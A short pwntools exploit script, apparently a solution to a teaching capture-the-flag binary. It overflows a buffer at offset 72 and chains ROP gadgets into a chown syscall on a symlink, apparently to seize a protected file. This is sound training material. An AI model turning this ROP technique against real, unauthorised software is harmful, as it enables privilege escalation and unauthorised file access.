#!/usr/bin/python3
from pwn import *
context.clear(arch='amd64')
context.binary = 'babyrop_level5_teaching1'
r = ROP(context.binary)
e = ELF('./babyrop_level5_teaching1')
#p = gdb.debug(['./babyrop_level5_teaching1'], 'b *read')
p = process('./babyrop_level5_teaching1')
p.clean()
getGadget = lambda x: p64(r.find_gadget(x).address)
chain = getGadget(['pop rax', 'ret'])
chain += p64(92)
# there is no pop rbx alone so i had to use this gadget
chain += getGadget(['pop rdi', 'ret'])
# we can create a symlink named e and e\x00 is at address 0x402332
chain += p64(0x402332)
chain += getGadget(['pop rsi', 'ret'])
chain += p64(1000)
chain += getGadget(['pop rdx', 'ret'])
chain += p64(1000)
chain += getGadget(['syscall'])
# send the ROP chain
p.send(fit({72:chain}))
#p.close()
p.interactive()